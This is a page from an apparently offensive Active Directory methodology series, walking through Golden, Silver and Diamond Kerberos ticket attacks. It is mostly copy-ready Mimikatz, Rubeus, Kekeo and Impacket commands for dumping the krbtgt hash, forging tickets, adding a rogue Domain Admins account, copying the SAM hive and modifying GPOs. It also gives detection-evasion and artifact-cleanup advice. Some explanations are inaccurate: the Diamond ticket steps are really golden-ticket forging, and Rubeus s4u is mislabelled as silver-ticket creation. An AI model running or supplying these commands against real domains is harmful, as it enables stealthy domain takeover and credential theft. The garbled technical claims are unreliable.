[Prev: 25_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 27_AD_CS_Enumeration.md](./27_AD_CS_Enumeration.md)

# ⚔️ Kerberos Advanced Attacks - Exploitation and Persistence

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## 📋 TABLE OF CONTENTS
1. [Overview](#-overview)
2. [Advanced Attack Fundamentals](#-advanced-attack-fundamentals)
3. [Golden Ticket Attacks](#-golden-ticket-attacks)
4. [Silver Ticket Attacks](#-silver-ticket-attacks)
5. [Diamond Ticket Attacks](#-diamond-ticket-attacks)
6. [Cross-References](#-cross-references)
7. [Quick Start Advanced Ops](#-quick-start-advanced-ops)
8. [At-a-Glance: Advanced Essentials](#-at-a-glance-advanced-essentials)
9. [Pivot Matrix: Strategic Next Steps](#-pivot-matrix-strategic-next-steps)
10. [Comprehensive Enumeration Tools](#-comprehensive-enumeration-tools)

## 🎯 OVERVIEW

**Kerberos Advanced Attacks** provides comprehensive techniques for advanced Kerberos exploitation, including Golden, Silver, and Diamond ticket attacks. This file focuses on sophisticated attack methods that can lead to complete domain compromise and persistent access.

### **🌟 What You'll Learn**
- **Advanced ticket manipulation** techniques and methods
- **Golden Ticket attacks** for complete domain access
- **Silver Ticket attacks** for service-specific access
- **Diamond Ticket attacks** for stealthy privilege escalation
- **Real-world attack scenarios** and practical exploitation

---

## 📋 **QUICK START ADVANCED OPS**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | Native | `klist` | Baseline tickets | 🟢 |
| 2 | Rubeus | `Rubeus tgtdeleg` | TGT delegation check | 🟡 |
| 3 | Mimikatz | `lsadump::dcsync /user:krbtgt` | KRBTGT hash (lab) | 🔴 |
| 4 | Rubeus | `golden /rc4:<krbtgt_hash> /user:Administrator /ptt` | Golden ticket | 🔴 |
| 5 | Rubeus | `s4u /user:svc /impersonateuser:admin /msdsspn:cifs/host /ptt` | S4U chain test | 🟠 |

## 🎭 **AT-A-GLANCE: ADVANCED ESSENTIALS**

**Reveals:** Ticket manipulation capability, KRBTGT/service hash usage, S4U feasibility.

**Use Cases:** Domain compromise (Golden), service‑scoped access (Silver), stealth escalation (Diamond), CD/RBCD chaining.

**Speed:** Stealth: minimal, spaced actions; Lab: full workflows.

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Pivot | Goal | Tool/Technique |
|---------|-------|------|----------------|
| KRBTGT hash in hand | Golden Ticket | Domain‑wide access | Mimikatz/Rubeus |
| Service account hash | Silver Ticket | Service scope access | Mimikatz/Rubeus |
| Legit TGT + krbtgt | Diamond Ticket | Stealth escalation | Mimikatz/Rubeus |
| CD/RBCD edges | S4U2Self/Proxy | File/DC access | Rubeus/Kekeo |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `klist`, `nltest /dsgetdc:<domain>`, `wevtutil` — ticket/DC/event sanity
- `Get-ADUser`, `Get-ADComputer`, `Get-ADDomain` — context verification

### ⚔️ Offensive (PowerView/SharpView)
```powershell
Get-Domain
Get-DomainTrust
Get-DomainUser -SPN | Select -First 10
Get-DomainComputer -TrustedToAuth
Get-DomainObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
```
```cmd
SharpView.exe Get-DomainTrust
SharpView.exe Get-DomainComputer -TrustedToAuth
```

### 🔴 Advanced Red Team (Golden/Silver/Diamond/S4U)
```cmd
:: Mimikatz
mimikatz "lsadump::dcsync /user:krbtgt /domain:corp.local" exit
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /krbtgt:<HASH> /ptt" exit
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /target:FILE01 /service:CIFS /rc4:<HASH> /ptt" exit

:: Rubeus
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:corp.local /sid:<SID> /user:Administrator /ptt
Rubeus.exe s4u /user:svc_web /rc4:<hash> /impersonateuser:Administrator /msdsspn:http/web01.corp.local /ptt
Rubeus.exe renew /ticket:<base64>
Rubeus.exe purge

:: Kekeo
kekeo.exe tgt::ask /user:svc /domain:corp.local /rc4:<hash>
kekeo.exe tgs::s4u /user:svc /service:cifs/filesrv.corp.local /impersonate:Administrator

:: Impacket
ticketer.py -domain corp.local -aesKey <krbtgt_aes> -spn CIFS/filesrv.corp.local forged
```

### 🛠️ OPSEC, LAB vs PRODUCTION, CLEANUP
- Prefer MS‑signed enumeration first; space sensitive actions and add jitter in production.
- Keep ticket lifetimes realistic; avoid unusual group SIDs.
- Cleanup: `klist purge`, `Rubeus purge`; remove artifacts and transcripts.

---

## 🎯 ADVANCED COMMAND REFERENCE (20+ with concise purpose)

```cmd
:: Mimikatz (Golden/Silver/Verify)
mimikatz "lsadump::dcsync /user:krbtgt /domain:corp.local" exit               :: Extract KRBTGT hash
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /krbtgt:<HASH> /ptt" exit  :: Golden ticket (PTT)
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /target:FILE01 /service:CIFS /rc4:<HASH> /ptt" exit  :: Silver CIFS
mimikatz "kerberos::list" exit                                                :: List current tickets
mimikatz "kerberos::ptt c:\\temp\\ticket.kirbi" exit                       :: Inject saved ticket

:: Rubeus (Golden/S4U/TGT ops)
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:corp.local /sid:<SID> /user:Administrator /ptt   :: Golden (PTT)
Rubeus.exe s4u /user:svc_web /rc4:<hash> /impersonateuser:admin /msdsspn:http/web01 /ptt      :: S4U chain
Rubeus.exe asktgt /user:svc /password:P@ssw0rd! /ptt                                         :: Ask TGT
Rubeus.exe renew /ticket:<base64TGT>                                                          :: Renew TGT
Rubeus.exe purge                                                                              :: Clear tickets
Rubeus.exe dump                                                                               :: Dump current tickets

:: Kekeo (TGT/TGS S4U)
kekeo.exe tgt::ask /user:svc /domain:corp.local /rc4:<hash>                                   :: TGT with RC4
kekeo.exe tgs::s4u /user:svc /service:cifs/filesrv.corp.local /impersonate:Administrator      :: S4U TGS

:: Impacket (Forge/Request)
ticketer.py -domain corp.local -aesKey <krbtgt_aes> Administrator -spn CIFS/filesrv.corp.local -save  :: Forge TGT
getTGT.py corp.local/Administrator:'P@ssw0rd!' -dc-ip 10.0.0.10                                  :: Get legit TGT
getST.py -spn CIFS/filesrv.corp.local corp.local/Administrator:'P@ssw0rd!' -dc-ip 10.0.0.10       :: Get service TGS

:: Verification
klist                                                                                         :: Ticket cache check
whoami /groups                                                                                :: Group SID context
```

```powershell
# PowerView/Context helpers
Get-Domain | fl *                                                                              # Domain context
Get-DomainTrust                                                                                # Trusts
Get-DomainUser -SPN | Select -First 10                                                         # SPN users sample
Get-DomainComputer -TrustedToAuth                                                              # CD computers
Get-DomainObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'                    # RBCD presence
```

---

## 🎭 PERSONAS: REAL-WORLD EXECUTION PROFILES

### 🕵️ Stealth Consultant (Production)
- Tools: MS‑signed discovery first; minimal ticket ops (Diamond/S4U) only when required
- Cadence: Single‑step actions with delays and realistic lifetimes; avoid broad Golden usage

### ⚡ Power User (Internal Assessment)
- Tools: PowerView context + targeted Rubeus S4U; occasional Silver for service checks
- Cadence: Short jitter between steps; limit scope to in‑site resources

### 👑 Red Team Lead (Lab/Full Ops)
- Tools: Full Mimikatz/Rubeus/Kekeo/Impacket; experiment with lifetimes/groups
- Cadence: Execute end‑to‑end workflows for documentation and rule tuning

## 🎨 VISUAL MASTERY: TICKET MANIPULATION FLOW


## ⚔️ ADVANCED ATTACK FUNDAMENTALS

### **What are Advanced Kerberos Attacks?**
**Advanced Kerberos Attacks** involve manipulating Kerberos tickets to gain unauthorized access, escalate privileges, and maintain persistence within Active Directory environments. These attacks target the fundamental trust mechanisms of Kerberos authentication.

### **Advanced Attack Types and Capabilities**

```mermaid
graph TB
    subgraph "🎫 Advanced Kerberos Attack Types"
        A[🎯 Advanced Attacks] --> B[👑 Golden Ticket]
        A --> C[🥈 Silver Ticket]
        A --> D[💎 Diamond Ticket]
        A --> E[🔄 Skeleton Key]
        A --> F[🌐 Cross-Forest]
        
        B --> B1[⚠️ Complete domain access]
        B --> B2[⚠️ Forged TGT creation]
        B --> B3[⚠️ KRBTGT hash required]
        
        C --> C1[🔒 Service-specific access]
        C --> C2[🔒 Forged service tickets]
        C --> C3[🔒 NTLM hash required]
        
        D --> D1[🎭 Modified legitimate TGT]
        D --> D2[🎭 Stealthy privilege escalation]
        D --> D3[🎭 Original TGT modification]
        
        E --> E1[💀 LSASS patching]
        E --> E2[💀 Universal password access]
        E --> E3[💀 System restart required]
        
        F --> F1[🌍 Cross-forest trust abuse]
        F --> F2[🌍 Trust key exploitation]
        F --> F3[🌍 SID history abuse]
    end
    
    subgraph "⚠️ Risk Assessment"
        G[🔴 CRITICAL RISK] --> H[Golden Ticket]
        I[🟡 HIGH RISK] --> J[Silver Ticket]
        K[🟠 MEDIUM RISK] --> L[Diamond Ticket]
        M[🔴 CRITICAL RISK] --> N[Skeleton Key]
    end
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#ffd700,stroke:#333,stroke-width:2px
    style C fill:#c0c0c0,stroke:#333,stroke-width:2px
    style D fill:#b9f2ff,stroke:#333,stroke-width:2px
    style E fill:#ff4757,stroke:#333,stroke-width:2px
    style F fill:#2ed573,stroke:#333,stroke-width:2px
    style G fill:#ff4757,stroke:#333,stroke-width:3px
    style H fill:#ffd700,stroke:#333,stroke-width:2px
    style I fill:#ffa502,stroke:#333,stroke-width:2px
    style J fill:#c0c0c0,stroke:#333,stroke-width:2px
    style K fill:#ff6348,stroke:#333,stroke-width:2px
    style L fill:#b9f2ff,stroke:#333,stroke-width:2px
    style M fill:#ff4757,stroke:#333,stroke-width:2px
    style N fill:#ff4757,stroke:#333,stroke-width:2px
```


### **Advanced Attack Prerequisites**
- **KRBTGT hash**: Required for Golden Ticket attacks
- **Service account hash**: Required for Silver Ticket attacks
- **Valid TGT**: Required for Diamond Ticket attacks
- **Domain admin access**: Required for Skeleton Key attacks
- **Trust relationships**: Required for cross-forest attacks

---

## 👑 GOLDEN TICKET ATTACKS

### **1. Golden Ticket Fundamentals**

#### **What is a Golden Ticket?**
**Golden Ticket** is a forged Ticket Granting Ticket (TGT) that provides complete domain access. It's created using the KRBTGT account's NTLM hash and can bypass all domain security controls.

#### **Golden Ticket Attack Scenario**
```powershell
# Golden Ticket attack scenario
Write-Host "=== GOLDEN TICKET ATTACK SCENARIO ===" -ForegroundColor Green

Write-Host "Attack Scenario: Complete Domain Compromise via Golden Ticket" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. KRBTGT account NTLM hash" -ForegroundColor White
Write-Host "  2. Domain SID" -ForegroundColor White
Write-Host "  3. Domain name" -ForegroundColor White
Write-Host "  4. Target username for impersonation" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Extract KRBTGT hash via DCSync or LSASS dump" -ForegroundColor White
Write-Host "  2. Obtain domain SID and name" -ForegroundColor White
Write-Host "  3. Create forged TGT using Mimikatz or Rubeus" -ForegroundColor White
Write-Host "  4. Use Golden Ticket for domain-wide access" -ForegroundColor White
Write-Host "  5. Maintain persistence across domain" -ForegroundColor White

Write-Host "`nHigh-Value Targets:" -ForegroundColor Yellow
Write-Host "  - Domain Controllers" -ForegroundColor Red
Write-Host "  - Enterprise Admin accounts" -ForegroundColor Red
Write-Host "  - Schema Admin accounts" -ForegroundColor Red
Write-Host "  - Domain Admin accounts" -ForegroundColor Red

Write-Host "`nDetection Evasion:" -ForegroundColor Yellow
Write-Host "  - Use legitimate usernames for tickets" -ForegroundColor White
Write-Host "  - Minimize suspicious activity" -ForegroundColor White
Write-Host "  - Clean up after use" -ForegroundColor White
```

### **2. Golden Ticket Creation and Usage**

#### **Mimikatz Golden Ticket Creation**
```powershell
# Mimikatz Golden Ticket creation
Write-Host "=== MIMIKATZ GOLDEN TICKET CREATION ===" -ForegroundColor Green

Write-Host "Golden Ticket Creation Commands:" -ForegroundColor Yellow

Write-Host "`n1. Extract KRBTGT Hash:" -ForegroundColor Cyan
Write-Host "   mimikatz # lsadump::dcsync /user:krbtgt /domain:cybercorp.local" -ForegroundColor White

Write-Host "`n2. Create Golden Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /ptt" -ForegroundColor White

Write-Host "`n3. Alternative Golden Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /groups:512,513,518,519,520 /ptt" -ForegroundColor White

Write-Host "`n4. Export Golden Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /ticket:golden.kirbi" -ForegroundColor White

Write-Host "`nParameter Explanation:" -ForegroundColor Yellow
Write-Host "  /user: Target username for impersonation" -ForegroundColor Gray
Write-Host "  /domain: Target domain name" -ForegroundColor Gray
Write-Host "  /sid: Domain SID" -ForegroundColor Gray
Write-Host "  /krbtgt: KRBTGT account NTLM hash" -ForegroundColor Gray
Write-Host "  /groups: Additional group SIDs (optional)" -ForegroundColor Gray
Write-Host "  /ptt: Pass the ticket to current session" -ForegroundColor Gray
Write-Host "  /ticket: Export ticket to file" -ForegroundColor Gray
```

#### **Rubeus Golden Ticket Creation**
```powershell
# Rubeus Golden Ticket creation
Write-Host "=== RUBEUS GOLDEN TICKET CREATION ===" -ForegroundColor Green

Write-Host "Rubeus Golden Ticket Commands:" -ForegroundColor Yellow

Write-Host "`n1. Create Golden Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe golden /rc4:KRBTGT_HASH /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:Administrator /ptt" -ForegroundColor White

Write-Host "`n2. Create Golden Ticket with Groups:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe golden /rc4:KRBTGT_HASH /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:Administrator /groups:512,513,518,519,520 /ptt" -ForegroundColor White

Write-Host "`n3. Export Golden Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe golden /rc4:KRBTGT_HASH /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:Administrator /outfile:golden.kirbi" -ForegroundColor White

Write-Host "`n4. Use Exported Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe ptt /ticket:golden.kirbi" -ForegroundColor White

Write-Host "`nParameter Explanation:" -ForegroundColor Yellow
Write-Host "  /rc4: KRBTGT account NTLM hash" -ForegroundColor Gray
Write-Host "  /domain: Target domain name" -ForegroundColor Gray
Write-Host "  /sid: Domain SID" -ForegroundColor Gray
Write-Host "  /user: Target username for impersonation" -ForegroundColor Gray
Write-Host "  /groups: Additional group SIDs (optional)" -ForegroundColor Gray
Write-Host "  /ptt: Pass the ticket to current session" -ForegroundColor Gray
Write-Host "  /outfile: Export ticket to file" -ForegroundColor Gray
```

### **3. Golden Ticket Exploitation**

#### **Domain-Wide Access Exploitation**
```powershell
# Golden Ticket exploitation for domain access
Write-Host "=== GOLDEN TICKET EXPLOITATION ===" -ForegroundColor Green

Write-Host "Exploitation Commands:" -ForegroundColor Yellow

Write-Host "`n1. Verify Golden Ticket:" -ForegroundColor Cyan
Write-Host "   klist" -ForegroundColor White
Write-Host "   mimikatz # kerberos::list" -ForegroundColor White
Write-Host "   Rubeus.exe tgtdeleg" -ForegroundColor White

Write-Host "`n2. Access Domain Resources:" -ForegroundColor Cyan
Write-Host "   # Access domain controller" -ForegroundColor Gray
Write-Host "   dir \\\\DC01.cybercorp.local\C$" -ForegroundColor White
Write-Host "   # Access file shares" -ForegroundColor Gray
Write-Host "   dir \\\\FILE01.cybercorp.local\Shares" -ForegroundColor White
Write-Host "   # Access SQL servers" -ForegroundColor Gray
Write-Host "   sqlcmd -S SQL01.cybercorp.local -E" -ForegroundColor White

Write-Host "`n3. Create New Users:" -ForegroundColor Cyan
Write-Host "   net user /add /domain AttackerUser Password123!" -ForegroundColor White
Write-Host "   net group \"Domain Admins\" AttackerUser /add /domain" -ForegroundColor White

Write-Host "`n4. DCSync Attack:" -ForegroundColor Cyan
Write-Host "   mimikatz # lsadump::dcsync /user:Administrator /domain:cybercorp.local" -ForegroundColor White
Write-Host "   mimikatz # lsadump::dcsync /user:krbtgt /domain:cybercorp.local" -ForegroundColor White

Write-Host "`n5. Group Policy Modification:" -ForegroundColor Cyan
Write-Host "   # Modify GPOs for persistence" -ForegroundColor Gray
Write-Host "   # Add startup scripts" -ForegroundColor Gray
Write-Host "   # Modify security settings" -ForegroundColor Gray
```

---

## 🥈 SILVER TICKET ATTACKS

### **1. Silver Ticket Fundamentals**

#### **What is a Silver Ticket?**
**Silver Ticket** is a forged service ticket that provides access to specific services. It's created using the service account's NTLM hash and can bypass service-level authentication controls.

#### **Silver Ticket Attack Scenario**
```powershell
# Silver Ticket attack scenario
Write-Host "=== SILVER TICKET ATTACK SCENARIO ===" -ForegroundColor Green

Write-Host "Attack Scenario: Service-Specific Access via Silver Ticket" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. Service account NTLM hash" -ForegroundColor White
Write-Host "  2. Service SPN" -ForegroundColor White
Write-Host "  3. Domain SID" -ForegroundColor White
Write-Host "  4. Target username for impersonation" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Extract service account hash via Kerberoasting" -ForegroundColor White
Write-Host "  2. Identify target service SPN" -ForegroundColor White
Write-Host "  3. Create forged service ticket using Mimikatz or Rubeus" -ForegroundColor White
Write-Host "  4. Use Silver Ticket for service access" -ForegroundColor White
Write-Host "  5. Maintain access to specific services" -ForegroundColor White

Write-Host "`nTarget Services:" -ForegroundColor Yellow
Write-Host "  - CIFS (File sharing)" -ForegroundColor Red
Write-Host "  - LDAP (Directory services)" -ForegroundColor Red
Write-Host "  - HTTP (Web services)" -ForegroundColor Red
Write-Host "  - MSSQLSvc (SQL Server)" -ForegroundColor Red
Write-Host "  - RPCSS (Remote procedure calls)" -ForegroundColor Red

Write-Host "`nDetection Evasion:" -ForegroundColor Yellow
Write-Host "  - Use legitimate usernames for tickets" -ForegroundColor White
Write-Host "  - Target specific services only" -ForegroundColor White
Write-Host "  - Minimize service access patterns" -ForegroundColor White
```

### **2. Silver Ticket Creation and Usage**

#### **Mimikatz Silver Ticket Creation**
```powershell
# Mimikatz Silver Ticket creation
Write-Host "=== MIMIKATZ SILVER TICKET CREATION ===" -ForegroundColor Green

Write-Host "Silver Ticket Creation Commands:" -ForegroundColor Yellow

Write-Host "`n1. CIFS Service Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:FILE01.cybercorp.local /service:CIFS /rc4:SERVICE_HASH /ptt" -ForegroundColor White

Write-Host "`n2. LDAP Service Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:DC01.cybercorp.local /service:LDAP /rc4:SERVICE_HASH /ptt" -ForegroundColor White

Write-Host "`n3. HTTP Service Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:WEB01.cybercorp.local /service:HTTP /rc4:SERVICE_HASH /ptt" -ForegroundColor White

Write-Host "`n4. MSSQL Service Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:Administrator /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SQL01.cybercorp.local /service:MSSQLSvc /rc4:SERVICE_HASH /ptt" -ForegroundColor White

Write-Host "`nParameter Explanation:" -ForegroundColor Yellow
Write-Host "  /user: Target username for impersonation" -ForegroundColor Gray
Write-Host "  /domain: Target domain name" -ForegroundColor Gray
Write-Host "  /sid: Domain SID" -ForegroundColor Gray
Write-Host "  /target: Target computer name" -ForegroundColor Gray
Write-Host "  /service: Target service type" -ForegroundColor Gray
Write-Host "  /rc4: Service account NTLM hash" -ForegroundColor Gray
Write-Host "  /ptt: Pass the ticket to current session" -ForegroundColor Gray
```

#### **Rubeus Silver Ticket Creation**
```powershell
# Rubeus Silver Ticket creation
Write-Host "=== RUBEUS SILVER TICKET CREATION ===" -ForegroundColor Green

Write-Host "Rubeus Silver Ticket Commands:" -ForegroundColor Yellow

Write-Host "`n1. CIFS Service Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe s4u /user:Administrator /rc4:SERVICE_HASH /impersonateuser:Administrator /msdsspn:CIFS/FILE01.cybercorp.local /ptt" -ForegroundColor White

Write-Host "`n2. LDAP Service Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe s4u /user:Administrator /rc4:SERVICE_HASH /impersonateuser:Administrator /msdsspn:LDAP/DC01.cybercorp.local /ptt" -ForegroundColor White

Write-Host "`n3. HTTP Service Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe s4u /user:Administrator /rc4:SERVICE_HASH /impersonateuser:Administrator /msdsspn:HTTP/WEB01.cybercorp.local /ptt" -ForegroundColor White

Write-Host "`n4. Export Service Ticket:" -ForegroundColor Cyan
Write-Host "   Rubeus.exe s4u /user:Administrator /rc4:SERVICE_HASH /impersonateuser:Administrator /msdsspn:CIFS/FILE01.cybercorp.local /outfile:silver.kirbi" -ForegroundColor White

Write-Host "`nParameter Explanation:" -ForegroundColor Yellow
Write-Host "  /user: Service account username" -ForegroundColor Gray
Write-Host "  /rc4: Service account NTLM hash" -ForegroundColor Gray
Write-Host "  /impersonateuser: Target username for impersonation" -ForegroundColor Gray
Write-Host "  /msdsspn: Target service SPN" -ForegroundColor Gray
Write-Host "  /ptt: Pass the ticket to current session" -ForegroundColor Gray
Write-Host "  /outfile: Export ticket to file" -ForegroundColor Gray
```

### **3. Silver Ticket Exploitation**

#### **Service-Specific Access Exploitation**
```powershell
# Silver Ticket exploitation for service access
Write-Host "=== SILVER TICKET EXPLOITATION ===" -ForegroundColor Green

Write-Host "Exploitation Commands:" -ForegroundColor Yellow

Write-Host "`n1. Verify Silver Ticket:" -ForegroundColor Cyan
Write-Host "   klist" -ForegroundColor White
Write-Host "   mimikatz # kerberos::list" -ForegroundColor White
Write-Host "   Rubeus.exe tgtdeleg" -ForegroundColor White

Write-Host "`n2. CIFS Service Access:" -ForegroundColor Cyan
Write-Host "   # Access file shares" -ForegroundColor Gray
Write-Host "   dir \\\\FILE01.cybercorp.local\C$" -ForegroundColor White
Write-Host "   dir \\\\FILE01.cybercorp.local\Shares" -ForegroundColor White
Write-Host "   # Copy files" -ForegroundColor Gray
Write-Host "   copy \\\\FILE01.cybercorp.local\C$\Windows\System32\config\sam C:\temp\sam" -ForegroundColor White

Write-Host "`n3. LDAP Service Access:" -ForegroundColor Cyan
Write-Host "   # Query Active Directory" -ForegroundColor Gray
Write-Host "   Get-ADUser -Server DC01.cybercorp.local -Filter *" -ForegroundColor White
Write-Host "   Get-ADComputer -Server DC01.cybercorp.local -Filter *" -ForegroundColor White

Write-Host "`n4. HTTP Service Access:" -ForegroundColor Cyan
Write-Host "   # Access web services" -ForegroundColor Gray
Write-Host "   Invoke-WebRequest -Uri \"http://WEB01.cybercorp.local\" -UseDefaultCredentials" -ForegroundColor White
Write-Host "   # Access web applications" -ForegroundColor Gray
Write-Host "   # Modify web content" -ForegroundColor Gray

Write-Host "`n5. MSSQL Service Access:" -ForegroundColor Cyan
Write-Host "   # Connect to SQL Server" -ForegroundColor Gray
Write-Host "   sqlcmd -S SQL01.cybercorp.local -E" -ForegroundColor White
Write-Host "   # Execute SQL commands" -ForegroundColor Gray
Write-Host "   SELECT * FROM sys.databases" -ForegroundColor White
```

---

## 💎 DIAMOND TICKET ATTACKS

### **1. Diamond Ticket Fundamentals**

#### **What is a Diamond Ticket?**
**Diamond Ticket** is a modified legitimate TGT that adds additional privileges or group memberships. It's created by modifying an existing TGT rather than forging a completely new one.

#### **Diamond Ticket Attack Scenario**
```powershell
# Diamond Ticket attack scenario
Write-Host "=== DIAMOND TICKET ATTACK SCENARIO ===" -ForegroundColor Green

Write-Host "Attack Scenario: Stealthy Privilege Escalation via Diamond Ticket" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. Valid TGT from legitimate user" -ForegroundColor White
Write-Host "  2. KRBTGT account NTLM hash" -ForegroundColor White
Write-Host "  3. Domain SID" -ForegroundColor White
Write-Host "  4. Target group SIDs for escalation" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Obtain legitimate TGT from user" -ForegroundColor White
Write-Host "  2. Extract KRBTGT hash via DCSync" -ForegroundColor White
Write-Host "  3. Modify TGT to add group memberships" -ForegroundColor White
Write-Host "  4. Use modified TGT for elevated access" -ForegroundColor White
Write-Host "  5. Maintain stealth by using legitimate user context" -ForegroundColor White

Write-Host "`nAdvantages:" -ForegroundColor Yellow
Write-Host "  - More stealthy than Golden Ticket" -ForegroundColor White
Write-Host "  - Uses legitimate user context" -ForegroundColor White
Write-Host "  - Harder to detect" -ForegroundColor White
Write-Host "  - Can add specific privileges" -ForegroundColor White

Write-Host "`nTarget Groups:" -ForegroundColor Yellow
Write-Host "  - Domain Admins (SID: 512)" -ForegroundColor Red
Write-Host "  - Enterprise Admins (SID: 519)" -ForegroundColor Red
Write-Host "  - Schema Admins (SID: 518)" -ForegroundColor Red
Write-Host "  - Account Operators (SID: 517)" -ForegroundColor Red
```

### **2. Diamond Ticket Creation and Usage**

#### **Diamond Ticket Creation Process**
```powershell
# Diamond Ticket creation process
Write-Host "=== DIAMOND TICKET CREATION PROCESS ===" -ForegroundColor Green

Write-Host "Creation Steps:" -ForegroundColor Yellow

Write-Host "`n1. Obtain Legitimate TGT:" -ForegroundColor Cyan
Write-Host "   # Extract TGT from current session" -ForegroundColor Gray
Write-Host "   mimikatz # kerberos::list /export" -ForegroundColor White
Write-Host "   # Or capture TGT from user" -ForegroundColor Gray
Write-Host "   mimikatz # sekurlsa::tickets /export" -ForegroundColor White

Write-Host "`n2. Extract KRBTGT Hash:" -ForegroundColor Cyan
Write-Host "   mimikatz # lsadump::dcsync /user:krbtgt /domain:cybercorp.local" -ForegroundColor White

Write-Host "`n3. Create Diamond Ticket:" -ForegroundColor Cyan
Write-Host "   mimikatz # kerberos::golden /user:LegitimateUser /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /groups:512,513,518,519,520 /ptt" -ForegroundColor White

Write-Host "`n4. Alternative Method (Rubeus):" -ForegroundColor Cyan
Write-Host "   Rubeus.exe golden /rc4:KRBTGT_HASH /domain:cybercorp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:LegitimateUser /groups:512,513,518,519,520 /ptt" -ForegroundColor White

Write-Host "`nParameter Explanation:" -ForegroundColor Yellow
Write-Host "  /user: Legitimate username (not Administrator)" -ForegroundColor Gray
Write-Host "  /domain: Target domain name" -ForegroundColor Gray
Write-Host "  /sid: Domain SID" -ForegroundColor Gray
Write-Host "  /krbtgt: KRBTGT account NTLM hash" -ForegroundColor Gray
Write-Host "  /groups: Additional group SIDs to add" -ForegroundColor Gray
Write-Host "  /ptt: Pass the ticket to current session" -ForegroundColor Gray
```

### **3. Diamond Ticket Exploitation**

#### **Stealthy Privilege Escalation**
```powershell
# Diamond Ticket exploitation for stealthy escalation
Write-Host "=== DIAMOND TICKET EXPLOITATION ===" -ForegroundColor Green

Write-Host "Exploitation Commands:" -ForegroundColor Yellow

Write-Host "`n1. Verify Diamond Ticket:" -ForegroundColor Cyan
Write-Host "   klist" -ForegroundColor White
Write-Host "   mimikatz # kerberos::list" -ForegroundColor White
Write-Host "   # Check for additional group memberships" -ForegroundColor Gray

Write-Host "`n2. Stealthy Domain Access:" -ForegroundColor Cyan
Write-Host "   # Access as legitimate user with elevated privileges" -ForegroundColor Gray
Write-Host "   Get-ADUser -Filter * -Properties memberof" -ForegroundColor White
Write-Host "   Get-ADComputer -Filter * -Properties *" -ForegroundColor White

Write-Host "`n3. Group Policy Modification:" -ForegroundColor Cyan
Write-Host "   # Modify GPOs stealthily" -ForegroundColor Gray
Write-Host "   Get-GPO -All" -ForegroundColor White
Write-Host "   # Add startup scripts" -ForegroundColor Gray
Write-Host "   # Modify security settings" -ForegroundColor Gray

Write-Host "`n4. Schema Modification:" -ForegroundColor Cyan
Write-Host "   # Modify AD schema if Schema Admin" -ForegroundColor Gray
Write-Host "   # Add custom attributes" -ForegroundColor Gray
Write-Host "   # Extend object classes" -ForegroundColor Gray

Write-Host "`n5. Trust Relationship Abuse:" -ForegroundColor Cyan
Write-Host "   # Modify trust relationships if Enterprise Admin" -ForegroundColor Gray
Write-Host "   # Add new trust relationships" -ForegroundColor Gray
